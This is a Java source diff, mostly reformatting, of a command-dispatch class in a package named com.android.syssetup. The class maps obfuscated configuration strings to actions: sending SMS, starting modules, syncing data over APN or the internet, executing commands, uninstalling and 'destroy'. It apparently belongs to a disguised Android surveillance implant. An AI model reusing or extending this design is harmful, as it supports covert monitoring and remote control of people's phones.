@@ -7,17 +7,18 @@
 
 package com.android.syssetup.action;
 
-import org.json.JSONException;
-
+import com.android.mm.M;
 import com.android.syssetup.Status;
 import com.android.syssetup.Trigger;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.conf.ConfAction;
 import com.android.syssetup.conf.ConfigurationException;
 import com.android.syssetup.util.Check;
-import com.android.mm.M;
+
+import org.json.JSONException;
 
 // TODO: Auto-generated Javadoc
+
 /**
  * The Class SubAction.
  */
@@ -26,9 +27,12 @@ public abstract class SubAction {
 	private static final String TAG = "SubAction"; //$NON-NLS-1$
 
 	private static final String startStr = M.e("start");
-	private static final String stopStr =  M.e("stop");;
+	private static final String stopStr = M.e("stop");
+	;
 
-	/** Parameters. */
+	/**
+	 * Parameters.
+	 */
 	private final ConfAction conf;
 
 	/** The want uninstall. */
@@ -37,8 +41,15 @@ public abstract class SubAction {
 	/** The want reload. */
 	// protected boolean wantReload;
 
-	/** The status. */
+	/**
+	 * The status.
+	 */
 	Status status;
+	/**
+	 * The finished.
+	 */
+	private boolean finished;
+	private boolean stop;
 
 	/**
 	 * Instantiates a new sub action.
@@ -53,10 +64,9 @@ public abstract class SubAction {
 
 	/**
 	 * Factory.
-	 * 
+	 *
 	 * @param type
-	 * @param params
-	 *            the conf params
+	 * @param params the conf params
 	 * @return the sub action
 	 * @throws JSONException
 	 * @throws ConfigurationException
@@ -70,29 +80,29 @@ public abstract class SubAction {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_UNINSTALL ***");//$NON-NLS-1$
 			}
-			
+
 			return new UninstallAction(params);
 		} else if (type.equals(M.e("sms"))) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_SMS ***");//$NON-NLS-1$
 			}
-			
+
 			return new SmsAction(params);
 		} else if (type.equals(M.e("module"))) { //$NON-NLS-1$
 			String status = params.getString(M.e("status")); //$NON-NLS-1$
 			if (status.equals(startStr)) { //$NON-NLS-1$
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_START_MODULE ***");//$NON-NLS-1$
-					Check.log(TAG + " params: " + params );
+					Check.log(TAG + " params: " + params);
 				}
-				
+
 				return new StartModuleAction(params);
 			} else if (status.equals(stopStr)) { //$NON-NLS-1$
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_STOP_MODULE ***");//$NON-NLS-1$
 				}
-				
+
 				return new StopModuleAction(params);
 			}
 		} else if (type.equals(M.e("event"))) { //$NON-NLS-1$
@@ -101,30 +111,30 @@ public abstract class SubAction {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_ENABLE_EVENT ***");//$NON-NLS-1$
 				}
-				
+
 				return new EnableEventAction(params);
 			} else if (status.equals(M.e("disable"))) { //$NON-NLS-1$
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_DISABLE_EVENT ***");//$NON-NLS-1$
 				}
-				
+
 				return new DisableEventAction(params);
 
 			}
 		} else if (type.equals(M.e("synchronize"))) { //$NON-NLS-1$
 			boolean apn = params.has(M.e("apn")); //$NON-NLS-1$
-			
+
 			if (apn) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_SYNC_APN ***");//$NON-NLS-1$
 				}
-				
+
 				return new SyncActionApn(params);
 			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_SYNC ***");//$NON-NLS-1$
 				}
-				
+
 				return new SyncActionInternet(params);
 			}
 
@@ -132,27 +142,27 @@ public abstract class SubAction {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_EXECUTE ***");//$NON-NLS-1$
 			}
-			
+
 			return new ExecuteAction(params);
 
 		} else if (type.equals(M.e("log"))) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_INFO ***");//$NON-NLS-1$
 			}
-			
+
 			return new LogAction(params);
 		} else if (type.equals(M.e("destroy"))) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_DESTROY ***");//$NON-NLS-1$
 			}
-			
+
 			return new DestroyAction(params);
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (factory) Error: unknown type: " + type); //$NON-NLS-1$
 			}
 		}
-		
+
 		return null;
 	}
 
@@ -160,31 +170,24 @@ public abstract class SubAction {
 		return conf.getType();
 	}
 
-	/** The finished. */
-	private boolean finished;
-
-	private boolean stop;
-
 	/**
 	 * Parse
-	 * 
-	 * @param jsubaction
-	 *            byte array from configuration
+	 *
+	 * @param jsubaction byte array from configuration
 	 */
 	protected abstract boolean parse(final ConfAction jsubaction);
 
 	/**
 	 * Execute.
-	 * 
+	 *
 	 * @param trigger
-	 * 
 	 * @return true, if successful
 	 */
 	public abstract boolean execute(Trigger trigger);
 
 	/**
 	 * Check. if is finished. //$NON-NLS-1$
-	 * 
+	 *
 	 * @return true, if is finished
 	 */
 	public synchronized boolean isFinished() {
@@ -197,16 +200,16 @@ public abstract class SubAction {
 	public void prepareExecute() {
 		synchronized (this) {
 			finished = false;
-			
-			
+
+
 		}
 	}
 
 	@Override
 	public String toString() {
-		if(Cfg.DEBUG){
+		if (Cfg.DEBUG) {
 			return "SubAction (" + conf.actionId + "/" + conf.subActionId + ") <" + conf.getType().toUpperCase() + "> " + conf; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
-		}else{
+		} else {
 			return conf.actionId + "/" + conf.subActionId; //$NON-NLS-1$
 		}
 	}
